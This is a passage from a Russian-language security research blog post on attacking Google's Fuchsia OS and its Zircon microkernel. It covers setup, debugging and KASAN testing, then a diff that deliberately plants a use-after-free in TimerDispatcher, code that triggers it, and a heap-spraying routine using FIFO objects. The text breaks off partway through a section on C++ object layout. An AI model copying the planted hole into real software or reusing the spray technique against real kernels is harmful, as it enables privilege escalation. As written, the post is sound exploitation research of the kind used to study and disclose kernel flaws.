---
layout: post
title:  "[ru] Fuchsia OS глазами атакующего"
date:   2022-06-16 13:37:00 +0300
---

[Fuchsia](https://fuchsia.dev/) — это операционная система общего назначения с открытым исходным кодом, разрабатываемая компанией Google. Эта операционная система построена на базе микроядра [Zircon](https://fuchsia.dev/fuchsia-src/concepts/kernel), код которого написан на C++. При [проектировании Fuchsia](https://opensource.googleblog.com/2020/12/expanding-fuchsias-open-source-model.html?m=1) приоритет был отдан безопасности, обновляемости и быстродействию. Как исследователь безопасности ядра Linux я заинтересовался операционной системой Fuchsia и решил посмотреть на нее с точки зрения атакующего. В этой статье я поделюсь результатами своей работы.

# Краткое содержание

- Обзор архитектуры безопасности операционной системы Fuchsia.
- Сборка Fuchsia из исходного кода, создание и запуск простейшего приложения.
- Микроядро Zircon: основы разработки ядра для Fuchsia, его отладка с помощью GDB.
- Результаты моих экспериментов по эксплуатации уязвимостей в микроядре Zircon:
  - Попытки фаззинга.
  - Эксплуатация повреждения памяти `C++`-объекта.
  - Перехват потока управления в ядре.
  - Установка руткита в Fuchsia.
- Демонстрация прототипа эксплойта.

> Я придерживаюсь принципов ответственного разглашения информации, поэтому сообщил мейнтейнерам Fuchsia о проблемах безопасности, обнаруженных в ходе этого исследования.

# Что такое Fuchsia OS

[Fuchsia](https://fuchsia.dev/) — это операционная система общего назначения с открытым исходным кодом. Компания Google начала ее разработку [в 2016 году](https://9to5google.com/2016/08/14/google-is-working-on-fuchsia-a-new-operating-system-that-isnt-based-on-linux/). В декабре 2020 года этот проект [был открыт](https://opensource.googleblog.com/2020/12/expanding-fuchsias-open-source-model.html?m=1) для внешних участников, а в мае 2021 года Google [впервые выпустила](https://9to5google.com/2021/05/25/google-releases-fuchsia-os-nest-hub/) Fuchsia на устройствах Nest Hub для управления умным домом. Операционная система поддерживает микроархитектуры `arm64` и `x86_64`. Разработка Fuchsia сейчас находится в активной фазе, проект выглядит живым, поэтому я решил поэкспериментировать с ним.

<center><img src="https://a13xp0p0v.github.io/img/fuchsia_logo.png" width="60%"></center><br/>

Рассмотрим [основные концепции](https://fuchsia.dev/fuchsia-src/concepts), на которых базируется архитектура Fuchsia. Эта ОС разрабатывается для [целого спектра устройств](https://9to5google.com/2019/05/09/what-is-google-fuchsia/): IoT, смартфонов, персональных рабочих станций. Разработчики Fuchsia уделяют особое внимание ее безопасности и обновляемости. Как результат, эта операционная система имеет необычную архитектуру безопасности:

 - Главное — в Fuchsia отсутствует концепция пользователя. Вместо этого разграничение доступа в ней основано на **разрешениях** (capabilities). Приложениям в пользовательском пространстве ядро предоставляет свои ресурсы в виде объектов, доступ к которым требует соответствующих разрешений. Иными словами, приложение не может использовать ядерный ресурс без выданного разрешения. Все приложения в Fuchsia имеют минимальные привилегии, необходимые для выполнения задачи. Поэтому в системе с такой архитектурой атака для повышения привилегий отличается от того, к чему мы привыкли в GNU/Linux-системах, где атакующий исполняет код как непривилегированный пользователь и эксплуатирует некоторую уязвимость для получения привилегий суперпользователя.

 - Второй интересный аспект — Fuchsia является **микроядерной ОС**. Это во многом определяет ее свойства безопасности. По сравнению с ядром Linux большое количество функциональности вынесено из микроядра Zircon в пользовательское пространство. Это существенно уменьшает периметр атаки ядра. Ниже представлена схема из документации Fuchsia, которая демонстрирует, что Zircon выполняет значительно меньше функций по сравнению с классическими монолитными ядрами ОС. Вместе с тем разработчики Zircon не стремятся сделать его совсем крошечным: в нем реализовано 176 системных вызовов, что намного больше, чем обычно бывает в других микроядрах. ![Microkernel architecture](https://a13xp0p0v.github.io/img/zircon-kernel-services.png)

 - Еще одно архитектурное решение, которое влияет на безопасность системы, — это **изоляция** компонентов (sandboxing). Компонентами называются приложения и системные сервисы в Fuchsia. Каждый из них работает в изолированном окружении — песочнице (sandbox), и все межпроцессное взаимодействие (inter-process communication, IPC) между ними явно декларируется. В Fuchsia даже нет глобальной файловой системы. Вместо этого каждому компоненту выдается отдельное пространство для работы с файлами. Это архитектурное решение явно увеличивает изоляцию и безопасность программного обеспечения в пользовательском пространстве. Вместе с тем, на мой взгляд, это делает микроядро Zircon особенно интересной целью для атакующего, поскольку Zircon предоставляет интерфейсы системных вызовов всем компонентам операционной системы.

 - Наконец, Fuchsia имеет необычную схему доставки и обновления ПО. Приложения идентифицируются с помощью URL и скачиваются системой непосредственно перед их запуском. Такое архитектурное решение было выбрано для того, чтобы программные пакеты в Fuchsia всегда были в актуальном состоянии (наподобие веб-страниц). <center><img src="https://a13xp0p0v.github.io/img/component-lifecycle.png" width="70%"></center><br/>

> Из-за перечисленных свойств безопасности Fuchsia я заинтересовался этой операционной системой и решил исследовать ее с точки зрения атакующего.

# Первый запуск

В документации Fuchsia представлено [хорошее руководство](https://fuchsia.dev/fuchsia-src/get-started) по быстрому старту. В нем дается ссылка на скрипт, который проверит, есть ли в вашей GNU/Linux-системе полный набор инструментов для разработки Fuchsia:

```shell
$ ./ffx-linux-x64 platform preflight
```

При запуске этот скрипт сообщает, что дистрибутивы, не родственные Debian, не поддерживаются. При этом я не заметил никаких проблем со сборкой Fuchsia на Fedora 34.

В документации также объясняется, как скачать исходный код Fuchsia и настроить переменные окружения, необходимые для компиляции. Вот команды, с помощью которых выполняется сборка системы в варианте `workstation product` для микроархитектуры `x86_64`:

```shell
$ fx clean
$ fx set workstation.x64 --with-base //bundles:tools
$ fx build
```

После сборки операционная система может быть запущена в эмуляторе [FEMU](https://fuchsia.dev/fuchsia-src/development/build/emulator) (Fuchsia emulator). FEMU базируется эмуляторе Android (AEMU), который, в свою очередь, является форком QEMU.

```shell
$ fx vdl start -N
```

[![Fuchsia emulator screenshot](https://a13xp0p0v.github.io/img/fuchsia_screenshot_1.png)](https://a13xp0p0v.github.io/img/fuchsia_screenshot_1.png) <br/><br/>

# Создаем приложение для Fuchsia

Теперь давайте создадим простейшее приложение hello world для Fuchsia. Как я уже упоминал, программы для Fuchsia называются компонентами. Вот эта команда создает шаблон нового компонента на языке `C++`:

```shell
$ fx create component --path src/a13x-pwns-fuchsia --lang cpp
```

Компонент будет писать приветствие в системный журнал (Fuchsia log):

```cpp
#include <iostream>

int main(int argc, const char** argv)
{
  std::cout << "Hello from a13x, Fuchsia!\n";
  return 0;
}
```

В манифесте компонента `src/a13x-pwns-fuchsia/meta/a13x_pwns_fuchsia.cml` должна быть разрешена работа с системным журналом:

```cpp
program: {
    // Use the built-in ELF runner.
    runner: "elf",

    // The binary to run for this component.
    binary: "bin/a13x-pwns-fuchsia",

    // Enable stdout logging
    forward_stderr_to: "log",
    forward_stdout_to: "log",
},
```

Вот команды, которые собирают Fuchsia с новым компонентом:

```shell
$ fx set workstation.x64 --with-base //bundles:tools --with-base //src/a13x-pwns-fuchsia
$ fx build
```

После компиляции мы можем протестировать систему с новым компонентом:
 1. Запускаем FEMU с помощью команды `fx vdl start -N` в первом терминале нашей GNU/Linux-системы.
 2. Запускаем сервер публикации пакетов Fuchsia во втором терминале с помощью команды `fx serve`.
 3. Выполнив команду `fx log`, открываем системный журнал Fuchsia в третьем терминале.
 4. Запускаем новый компонент в Fuchsia с помощью команды `ffx` в четвертом терминале:
 ```shell
 $ ffx component run fuchsia-pkg://fuchsia.com/a13x-pwns-fuchsia#meta/a13x_pwns_fuchsia.cm --recreate
 ```

[![Fuchsia component screenshot](https://a13xp0p0v.github.io/img/fuchsia_screenshot_2.png)](https://a13xp0p0v.github.io/img/fuchsia_screenshot_2.png)

На снимке экрана можно увидеть, как Fuchsia нашла компонент по URL, загрузила его с сервера публикации пакетов и запустила. В результате компонент напечатал сообщение `Hello from a13x, Fuchsia!` в системном журнале, показанном в третьем терминале.

# Обычный день разработчика Zircon

Теперь рассмотрим, какими инструментами пользуется разработчик микроядра Zircon в своей повседневной работе. Код Zircon на языке `C++` является частью исходного кода Fuchsia и находится в директории `zircon/kernel`. Сборка микроядра происходит при компиляции Fuchsia. Для разработки и отладки требуется запускать Zircon в QEMU с помощью команды `fx qemu -N`, однако у меня система выдала ошибку при первом же выполнении команды:

```shell
$ fx qemu -N
Building multiboot.bin, fuchsia.zbi, obj/build/images/fuchsia/fuchsia/fvm.blk
ninja: Entering directory `/home/a13x/develop/fuchsia/src/fuchsia/out/default'
ninja: no work to do.
ERROR: Could not extend FVM, unable to stat FVM image out/default/obj/build/images/fuchsia/fuchsia/fvm.blk
```

Я обнаружил, что ошибка появляется, только если на системе настроена локаль, отличная от английской. Эта неполадка [известна уже давно](https://github.com/assusdan/fuchsia-patches). Понятия не имею, почему имеющееся исправление до сих пор не принято в Fuchsia OS. С ним Fuchsia успешно стартует на виртуальной машине, созданной в QEMU/KVM:

```diff
diff --git a/tools/devshell/lib/fvm.sh b/tools/devshell/lib/fvm.sh
index 705341e482c..5d1c7658d34 100644
--- a/tools/devshell/lib/fvm.sh
+++ b/tools/devshell/lib/fvm.sh
@@ -35,3 +35,3 @@ function fx-fvm-extend-image {
   fi
-  stat_output=$(stat "${stat_flags[@]}" "${fvmimg}")
+  stat_output=$(LC_ALL=C stat "${stat_flags[@]}" "${fvmimg}")
   if [[ "$stat_output" =~ Size:\ ([0-9]+) ]]; then
```

Запуск Fuchsia в QEMU/KVM позволяет выполнять отладку микроядра Zircon с помощью GDB. Вот как это выглядит на практике:

1. Запускаем Fuchsia:
```shell
$ fx qemu -N -s 1 --no-kvm -- -s
```
 - Аргумент `-s 1` задает количество процессорных ядер у виртуальной машины. Запуск с одним vCPU существенно упрощает работу с отладчиком.
 - Аргумент `--no-kvm` отключает аппаратную виртуализацию. Он полезен, если вам необходима пошаговая отладка (single-stepping). Без этого аргумента после каждой команды `stepi` или `nexti` отладчик будет проваливаться в обработчик прерывания, которое доставил гипервизор KVM. Однако, естественно, в режиме `--no-kvm` виртуальная машина с Fuchsia будет работать сильно медленнее, чем с аппаратной виртуализацией.
 - Аргумент `-s` в конце команды задействует gdbserver, который открывает сетевой порт 1234.

2. Разрешаем выполнение GDB-скрипта для Zircon. Он предоставляет следующие функции:
  - Адаптация к рандомизации адресного пространства ядра (KASLR) для корректного размещения точек останова (breakpoints).
  - Специальные команды GDB с префиксом `zircon`.
  - Улучшенное отображение сообщений об отказах микроядра Zircon.
```shell
$ cat ~/.gdbinit
add-auto-load-safe-path /home/a13x/develop/fuchsia/src/fuchsia/out/default/kernel_x64/zircon.elf-gdb.py
```

3. Запускаем GDB-клиент и подключаемся к GDB-серверу виртуальной машины с Fuchsia:
```shell
$ cd /home/a13x/develop/fuchsia/src/fuchsia/out/default/
$ gdb kernel_x64/zircon.elf
(gdb) target extended-remote :1234
```

Эта процедура позволяет отлаживать микроядро Zircon в GDB, как мы привыкли это делать с ядром Linux. Однако на моей машине упомянутый GDB-скрипт для Zircon безнадежно зависал при каждом запуске — пришлось разбираться. Оказалось, что он вызывает GDB-команду `add-symbol-file` с параметром `-readnow`, который требует от отладчика немедленно обработать все символы из 110-мегабайтного исполняемого файла Zircon. По какой-то причине у GDB не получается сделать это за обозримое время, и кажется, будто отладчик завис. Без параметра `-readnow` проблема исчезла, и я получил нормальную отладку микроядра Zircon в GDB:

```diff
diff --git a/zircon/kernel/scripts/zircon.elf-gdb.py b/zircon/kernel/scripts/zircon.elf-gdb.py
index d027ce4af6d..8faf73ba19b 100644
--- a/zircon/kernel/scripts/zircon.elf-gdb.py
+++ b/zircon/kernel/scripts/zircon.elf-gdb.py
@@ -798,3 +798,3 @@ def _offset_symbols_and_breakpoints(kernel_relocated_base=None):
     # Reload the ELF with all sections set
-    gdb.execute("add-symbol-file \"%s\" 0x%x -readnow %s" \
+    gdb.execute("add-symbol-file \"%s\" 0x%x %s" \
                 % (sym_path, text_addr, " ".join(args)), to_string=True)
```

[![Zircon GDB screenshot](https://a13xp0p0v.github.io/img/fuchsia_screenshot_3.png)](https://a13xp0p0v.github.io/img/fuchsia_screenshot_3.png) <br/><br/>

# Подбираемся к безопасности Fuchsia: включение KASAN

[KASAN](https://google.github.io/kernel-sanitizers/) (Kernel Address SANitizer) — это технология обнаружения повреждения ядерной памяти. Она позволяет находить выход за границу массива (out-of-bounds accesses) и использование памяти после освобождения (use after free). В Fuchsia поддерживается компиляция микроядра Zircon с инструментацией KASAN. Я решил испробовать эту функциональность и собрал Fuchsia в варианте `core product`:

```shell
$ fx set core.x64 --with-base //bundles:tools --with-base //src/a13x-pwns-fuchsia --variant=kasan
$ fx build
```

Чтобы протестировать, как KASAN ловит повреждения ядерной памяти, я добавил синтетическую ошибку освобождения памяти в код Fuchsia, работающий с объектом `TimerDispatcher`:

```diff
diff --git a/zircon/kernel/object/timer_dispatcher.cc b/zircon/kernel/object/timer_dispatcher.cc
index a83b750ad4a..14535e23ca9 100644
--- a/zircon/kernel/object/timer_dispatcher.cc
+++ b/zircon/kernel/object/timer_dispatcher.cc
@@ -184,2 +184,4 @@ void TimerDispatcher::OnTimerFired() {
 
+  bool uaf = false;
+
   {
@@ -187,2 +189,6 @@ void TimerDispatcher::OnTimerFired() {
 
+    if (deadline_ % 100000 == 31337) {
+      uaf = true;
+    }
+
     if (cancel_pending_) {
@@ -210,3 +216,3 @@ void TimerDispatcher::OnTimerFired() {
   // ourselves.
-  if (Release())
+  if (Release() || uaf)
     delete this;
```

Если таймер выставляется на задержку, значение которой заканчивается цифрами `31337`, то память объекта `TimerDispatcher` освобождается вне зависимости от счетчика ссылок (refcount). Я захотел спровоцировать эту ядерную ошибку из моего компонента в пользовательском пространстве, чтобы увидеть, как ядро уходит в отказ и отображает отчет KASAN. Для этого я добавил следующий код в мой компонент `a13x-pwns-fuchsia`:

```c
  zx_status_t status;
  zx_handle_t timer;
  zx_time_t deadline;

  status = zx_timer_create(ZX_TIMER_SLACK_LATE, ZX_CLOCK_MONOTONIC, &timer);
  if (status != ZX_OK) {
    printf("[-] creating timer failed\n");
    return 1;
  }

  printf("[+] timer is created\n");

  deadline = zx_deadline_after(ZX_MSEC(500));
  deadline = deadline - deadline % 100000 + 31337;
  status = zx_timer_set(timer, deadline, 0);
  if (status != ZX_OK) {
    printf("[-] setting timer failed\n");
    return 1;
  }

  printf("[+] timer is set with deadline %ld\n", deadline);
  fflush(stdout);
  zx_nanosleep(zx_deadline_after(ZX_MSEC(800))); // timer fired

  zx_timer_cancel(timer); // hit UAF
```

Здесь компонент сначала выполняет системный вызов `zx_timer_create()`. Он инициализирует таймер и возвращает в пользовательское пространство специальный указатель на него (handle), имеющий тип `zx_handle_t`. Затем для таймера устанавливается задержка, значение которой заканчивается «элитными» цифрами `31337`. Пока программа ожидает на вызове `zx_nanosleep()`, Zircon освобождает память сработавшего таймера. А последующий системный вызов `zx_timer_cancel()` для удаленного таймера приводит к использованию памяти после освобождения.

KASAN обнаруживает повреждение ядерной памяти и уводит микроядро в отказ при выполнении этого кода в пользовательском пространстве. Вместе с тем в ядерном логе распечатывается вот такой замечательный отчет:

```
ZIRCON KERNEL PANIC

UPTIME: 17826ms, CPU: 2
...

KASAN detected a write error: ptr={data:0xffffff806cd31ea8}, size=0x4, caller: {pc:0xffffffff003c169a}
Shadow memory state around the buggy address 0xffffffe00d9a63d5:
0xffffffe00d9a63c0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffffe00d9a63c8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffffe00d9a63d0: 0xfa 0xfa 0xfa 0xfa 0xfd 0xfd 0xfd 0xfd
                                              ^^           
0xffffffe00d9a63d8: 0xfd 0xfd 0xfd 0xfd 0xfd 0xfd 0xfd 0xfd
0xffffffe00d9a63e0: 0xfd 0xfd 0xfd 0xfd 0xfd 0xfd 0xfd 0xfd

*** KERNEL PANIC (caller pc: 0xffffffff0038910d, stack frame: 0xffffff97bd72ee70):
...

Halted
entering panic shell loop
! 
```

Отлично, KASAN работает. Zircon также выводит трассу исполнения (backtrace), но в нечитаемом виде, как цепочку ядерных указателей. Чтобы это исправить, нужно обработать содержимое ядерного журнала с помощью специального инструмента:

```shell
$ cat crash.txt | fx symbolize > crash_sym.txt
```

Вот как трасса исполнения выглядит после `fx symbolize`:

```
dso: id=58d07915d755d72e base=0xffffffff00100000 name=zircon.elf
   #0    0xffffffff00324b7d in platform_specific_halt(platform_halt_action, zircon_crash_reason_t, bool) ../../zircon/kernel/platform/pc/power.cc:154 <kernel>+0xffffffff80324b7d
   #1    0xffffffff005e4610 in platform_halt(platform_halt_action, zircon_crash_reason_t) ../../zircon/kernel/platform/power.cc:65 <kernel>+0xffffffff805e4610
   #2.1  0xffffffff0010133e in $anon::PanicFinish() ../../zircon/kernel/top/debug.cc:59 <kernel>+0xffffffff8010133e
   #2    0xffffffff0010133e in panic(const char*) ../../zircon/kernel/top/debug.cc:92 <kernel>+0xffffffff8010133e
   #3    0xffffffff0038910d in asan_check(uintptr_t, size_t, bool, void*) ../../zircon/kernel/lib/instrumentation/asan/asan-poisoning.cc:180 <kernel>+0xffffffff8038910d
   #4.4  0xffffffff003c169a in std::__2::__cxx_atomic_fetch_add<int>(std::__2::__cxx_atomic_base_impl<int>*, int, std::__2::memory_order) ../../prebuilt/third_party/clang/linux-x64/include/c++/v1/atomic:1002 <kernel>+0xffffffff803c169a
   #4.3  0xffffffff003c169a in std::__2::__atomic_base<int, true>::fetch_add(std::__2::__atomic_base<int, true>*, int, std::__2::memory_order) ../../prebuilt/third_party/clang/linux-x64/include/c++/v1/atomic:1686 <kernel>+0xffffffff803c169a
   #4.2  0xffffffff003c169a in fbl::internal::RefCountedBase<true>::AddRef(const fbl::internal::RefCountedBase<true>*) ../../zircon/system/ulib/fbl/include/fbl/ref_counted_internal.h:39 <kernel>+0xffffffff803c169a
   #4.1  0xffffffff003c169a in fbl::RefPtr<Dispatcher>::operator=(const fbl::RefPtr<Dispatcher>&, fbl::RefPtr<Dispatcher>*) ../../zircon/system/ulib/fbl/include/fbl/ref_ptr.h:89 <kernel>+0xffffffff803c169a
   #4    0xffffffff003c169a in HandleTable::GetDispatcherWithRightsImpl<TimerDispatcher>(HandleTable*, zx_handle_t, zx_rights_t, fbl::RefPtr<TimerDispatcher>*, zx_rights_t*, bool) ../../zircon/kernel/object/include/object/handle_table.h:243 <kernel>+0xffffffff803c169a
   #5.2  0xffffffff003d3f02 in HandleTable::GetDispatcherWithRights<TimerDispatcher>(HandleTable*, zx_handle_t, zx_rights_t, fbl::RefPtr<TimerDispatcher>*, zx_rights_t*) ../../zircon/kernel/object/include/object/handle_table.h:108 <kernel>+0xffffffff803d3f02
   #5.1  0xffffffff003d3f02 in HandleTable::GetDispatcherWithRights<TimerDispatcher>(HandleTable*, zx_handle_t, zx_rights_t, fbl::RefPtr<TimerDispatcher>*) ../../zircon/kernel/object/include/object/handle_table.h:116 <kernel>+0xffffffff803d3f02
   #5    0xffffffff003d3f02 in sys_timer_cancel(zx_handle_t) ../../zircon/kernel/lib/syscalls/timer.cc:67 <kernel>+0xffffffff803d3f02
   #6.2  0xffffffff003e1ef1 in λ(const wrapper_timer_cancel::(anon class)*, ProcessDispatcher*) gen/zircon/vdso/include/lib/syscalls/kernel-wrappers.inc:1170 <kernel>+0xffffffff803e1ef1
   #6.1  0xffffffff003e1ef1 in do_syscall<(lambda at gen/zircon/vdso/include/lib/syscalls/kernel-wrappers.inc:1169:85)>(uint64_t, uint64_t, bool (*)(uintptr_t), wrapper_timer_cancel::(anon class)) ../../zircon/kernel/lib/syscalls/syscalls.cc:106 <kernel>+0xffffffff803e1ef1
   #6    0xffffffff003e1ef1 in wrapper_timer_cancel(SafeSyscallArgument<unsigned int, true>::RawType, uint64_t) gen/zircon/vdso/include/lib/syscalls/kernel-wrappers.inc:1169 <kernel>+0xffffffff803e1ef1
   #7    0xffffffff005618e8 in gen/zircon/vdso/include/lib/syscalls/kernel.inc:1103 <kernel>+0xffffffff805618e8
```

Здесь можно видеть, что обработчик `wrapper_timer_cancel()` системного вызова выполняет функцию `sys_timer_cancel()`, где `GetDispatcherWithRightsImpl<TimerDispatcher>()` обращается ко счетчику ссылок (reference counter), расположенному в освобожденной памяти объекта `TimerDispatcher`. Эта ошибка обнаруживается в функции `asan_check()`, принадлежащей механизму KASAN. В итоге работа ядра прерывается с помощью вызова `panic()`.

Эта трасса исполнения детально описывает, как на самом деле работает код функции `sys_timer_cancel()`:

```cpp
// zx_status_t zx_timer_cancel
zx_status_t sys_timer_cancel(zx_handle_t handle) {
  auto up = ProcessDispatcher::GetCurrent();

  fbl::RefPtr<TimerDispatcher> timer;
  zx_status_t status = up->handle_table().GetDispatcherWithRights(handle, ZX_RIGHT_WRITE, &timer);
  if (status != ZX_OK)
    return status;

  return timer->Cancel();
}
```

> Когда я получил работающий KASAN для Fuchsia, я почувствовал, что готов начать исследование с позиции атакующего.

# syzkaller для Fuchsia (сломан)

После изучения основ ядерной разработки Fuchsia и тестирования KASAN я приступил к экспериментам с безопасностью. Я поставил цель — разработать прототип эксплойта для уязвимости в Zircon, и в первую очередь мне нужно было найти подходящую уязвимость. Для поиска я решил использовать фаззинг.

Есть прекрасный фаззер для ядер операционных систем, который называется [syzkaller](https://github.com/google/syzkaller). Мне очень нравится этот проект, я уже давно использую его для фаззинга ядра Linux. В документации говорится, что syzkaller [поддерживает фаззинг Fuchsia](https://github.com/google/syzkaller/blob/master/docs/fuchsia/README.md), поэтому я сразу решил это попробовать.

Однако возникли трудности из-за необычной схемы доставки ПО для Fuchsia, о которой говорилось выше. Системный образ Fuchsia для фаззинга должен содержать программу `syz-executor` в качестве компонента. `syz-executor` — это часть проекта syzkaller, которая отвечает за выполнение фаззинга системных вызовов в виртуальной машине. Мне не удалось собрать образ Fuchsia с этим компонентом.

Вначале я попробовал скомпилировать Fuchsia с исходниками syzkaller, размещенными во внешней директории. Этот способ не сработал, хотя он [рекомендуется в документации](https://github.com/google/syzkaller/blob/master/docs/fuchsia/README.md):

```
$ fx --dir "out/x64" set core.x64 \
  --with-base "//bundles:tools" \
  --with-base "//src/testing/fuzzing/syzkaller" \
  --args=syzkaller_dir='"/home/a13x/develop/gopath/src/github.com/google/syzkaller/"'
ERROR at //build/go/go_library.gni:43:3 (//build/toolchain:host_x64): Assertion failed.
   assert(defined(invoker.sources), "sources is required for go_library")
   ^-----
sources is required for go_library
See //src/testing/fuzzing/syzkaller/BUILD.gn:106:3: whence it was called.
   go_library("syzkaller-go") {
   ^---------------------------
See //src/testing/fuzzing/syzkaller/BUILD.gn:85:5: which caused the file to be included.
     ":run-sysgen($host_toolchain)",
     ^-----------------------------
ERROR: error running gn gen: exit status 1
```

Я попытался отладить систему сборки Fuchsia и выяснил, что она неправильно обрабатывает аргумент `syzkaller_dir`, но починить это мне не удалось.

Затем я обнаружил, что в исходном коде Fuchsia в директории `third_party/syzkaller/` хранится локальная копия исходников syzkaller. Система сборки использует ее, если не задан аргумент `--args=syzkaller_dir`, но эта копия syzkaller старая: в ней отсутствуют все коммиты после 2 июня 2020 года. Я попробовал собрать текущую версию Fuchsia с этой старой версией фаззера, что также не удалось сделать из-за перемещения файлов и множества изменений в системных вызовах Fuchsia, которые произошли с того момента.

Тогда я попробовал обновить версию фаззера в директории `third_party/syzkaller/` в надежде, что свежие коммиты в репозитории syzkaller помогут синхронизироваться с текущей версией Fuchsia. Но эта затея также провалилась, потому что для сборки актуальной версии `syz-executor` требуется внести значительные изменения в его [сборочный файл `BUILD.gn`](https://fuchsia.googlesource.com/fuchsia/+/refs/heads/main/src/testing/fuzzing/syzkaller/BUILD.gn).

В итоге ситуация выглядит так: интеграция операционной системы Fuchsia с фаззером syzkaller, возможно, и работала когда-то в 2020 году, но сейчас она сломана. По истории разработки Fuchsia в системе контроля версий я нашел авторов этого кода и отправил им электронное письмо, в котором детально описал все обнаруженные неполадки и попросил помощи, но ответа не получил.

Чем больше времени я тратил на борьбу с системой сборки Fuchsia, тем больше начинал сердиться.

# Трудный выбор дальнейшей стратегии

Тогда я крепко задумался о стратегии моих дальнейших исследований.

<center><img src="https://a13xp0p0v.github.io/img/Vityaz.jpg" width="90%"><br/>В. М. Васнецов. «Витязь на распутье». 1882 год</center><br/>

Без фаззинга для успешного поиска уязвимостей обязательно требуются:
 1. хорошее знание кодовой базы атакуемой системы;
 2. глубокое понимание ее периметра атаки.

Чтобы приобрести эти знания об операционной системе Fuchsia, мне пришлось бы потратить много времени и сил. Хотел ли я этого при моем первом знакомстве с Fuchsia? Пожалуй, нет, потому что:
 - неразумно тратить большое количество ресурсов на первое ознакомительное исследование;
 - по первому впечатлению, Fuchsia оказалась менее подготовлена к промышленному использованию, чем я ожидал.

Поэтому скрепя сердце я решил пока не жадничать и отложить поиск уязвимостей нулевого дня (zero-day) в микроядре Zircon. Вместо этого я задумал разработать прототип эксплойта для той синтетической уязвимости, которую я использовал при тестировании KASAN. В конечном итоге это оказалось удачным решением, поскольку я относительно быстро получил результат, а также смог найти несколько проблем безопасности в Zircon.

# Нам нужен спрей!

Таким образом, я сосредоточился на эксплуатации использования памяти после освобождения для объекта `TimerDispatcher`. Моя стратегия состояла в том, чтобы перезаписать освобожденный `TimerDispatcher` контролируемыми данными и тем самым спровоцировать нештатную работу микроядра Zircon, которой я как атакующий смогу управлять.

<center><img src="https://a13xp0p0v.github.io/img/uaf.png" width="70%"></center><br/>

В первую очередь для перезаписи объекта `TimerDispatcher` мне нужно было реализовать технику эксплуатации [heap spraying](https://ru.wikipedia.org/wiki/Heap_spraying), которая:
 1. может быть использована атакующим из непривилегированного кода в пользовательском пространстве;
 2. заставляет Zircon выделить множество новых ядерных объектов (вот почему это называется спреем), один из которых с большой вероятностью попадет на место освобожденного;
 3. заставляет Zircon наполнить этот новый ядерный объект данными атакующего, скопированными из пользовательского пространства.

Из своего опыта эксплуатации уязвимостей для ядра Linux я знал, что heap spraying обычно конструируется с помощью средств межпроцессного взаимодействия (IPC). Базовые системные вызовы, предоставляющие IPC, доступны непривилегированным программам, что соответствует первому из трех названных мной свойств heap spraying. Такие системные вызовы копируют пользовательские данные в адресное пространство ядра, чтобы затем передать их получателю, — это свойство номер три. И, наконец, некоторые системные вызовы, предоставляющие IPC, позволяют задавать размер передаваемых данных, что дает атакующему возможность контролировать поведение ядерного аллокатора и позволяет перезаписать освобожденный целевой объект, — это соответствует свойству номер два.

Чтобы сконструировать heap spraying для микроядра Zircon, я принялся изучать [его системные вызовы](https://fuchsia.dev/fuchsia-src/reference/syscalls), предоставляющие IPC, и отыскал [Zircon FIFO](https://fuchsia.dev/fuchsia-src/reference/syscalls/fifo_create). Это очереди для передачи сообщений, с помощью которых отлично получилось реализовать технику heap spraying. Когда выполняется системный вызов `zx_fifo_create()`, Zircon создает пару объектов `FifoDispatcher` (этот код можно посмотреть в файле [zircon/kernel/object/fifo_dispatcher.cc](https://fuchsia.googlesource.com/fuchsia/+/refs/heads/main/zircon/kernel/object/fifo_dispatcher.cc)). Для каждого из них выделяется запрашиваемое количество ядерной памяти под данные:

```c++
  auto data0 = ktl::unique_ptr<uint8_t[]>(new (&ac) uint8_t[count * elemsize]);
  if (!ac.check())
    return ZX_ERR_NO_MEMORY;

  KernelHandle fifo0(fbl::AdoptRef(
      new (&ac) FifoDispatcher(ktl::move(holder0), options, static_cast<uint32_t>(count),
                               static_cast<uint32_t>(elemsize), ktl::move(data0))));
  if (!ac.check())
    return ZX_ERR_NO_MEMORY;
```

С помощью отладчика я определил, что размер освобожденного объекта `TimerDispatcher` составляет 248 байт. Я попробовал создать несколько FIFO-объектов такого же размера, и это сработало: в отладчике я увидел, что `TimerDispatcher` перезаписан данными одного из объектов `FifoDispatcher`! Вот код, выполняющий heap spraying в моем прототипе эксплойта:

```c
  printf("[!] do heap spraying...\n");

#define N 10
  zx_handle_t out0[N];
  zx_handle_t out1[N];
  size_t write_result = 0;

  for (int i = 0; i < N; i++) {
    status = zx_fifo_create(31, 8, 0, &out0[i], &out1[i]);
    if (status != ZX_OK) {
      printf("[-] creating a fifo %d failed\n", i);
      return 1;
    }
  }
```

Здесь системный вызов `zx_fifo_create()` выполняется десять раз. При каждом вызове создается пара очередей из 31 элемента по 8 байт. То есть при выполнении этого кода в ядре создается 20 объектов `FifoDispatcher` с буферами данных размером 248 байт. Zircon размещает один из этих буферов на месте освобожденного `TimerDispatcher`, который имел такой же размер.

Далее очереди наполняются данными, специально подготовленными для перезаписи содержимого объекта `TimerDispatcher`: их называют heap spraying payload.

```c
  for (int i = 0; i < N; i++) {
    status = zx_fifo_write(out0[i], 8, spray_data, 31, &write_result);
    if (status != ZX_OK || write_result != 31) {
      printf("[-] writing to fifo 0-%d failed, error %d, result %zu\n", i, status, write_result);
      return 1;
    }
    status = zx_fifo_write(out1[i], 8, spray_data, 31, &write_result);
    if (status != ZX_OK || write_result != 31) {
      printf("[-] writing to fifo 1-%d failed, error %d, result %zu\n", i, status, write_result);
      return 1;
    }
  }

  printf("[+] heap spraying is finished\n");
```

> Хорошо. Я получил возможность изменить содержимое ядерного объекта `TimerDispatcher`. Но что же нужно в него записать, чтобы атаковать Zircon?

# Анатомия объекта в C++

Я привык к тому, что в Linux ядерные объекты описываются структурами на языке C. Метод ядерного объекта там может быть реализован с помощью указателя на функцию, который хранится в поле соответствующей структуры. Поэтому раскладка данных объекта в памяти ядра Linux обычно простая и наглядная.

Когда же я стал изучать внутреннее устройство `C++`-объектов микроядра Zircon, их раскладка в памяти показалась мне более сложной и запутанной. Я решил разобраться с анатомией объекта `TimerDispatcher` и попробовал распечатать его в отладчике с помощью команды `print -pretty on -vtbl on`. В ответ GDB вывел огромную иерархию вложенных друг в друга классов, которую мне не удалось соотнести с конкретными байтами в ядерной памяти. Затем для класса `TimerDispatcher` я попробовал применить утилиту `pahole`. Получилось лучше: она распечатала отступы полей внутри классов, но не помогла мне понять, как там реализованы методы. Наследование классов сильно усложняло всю картину.

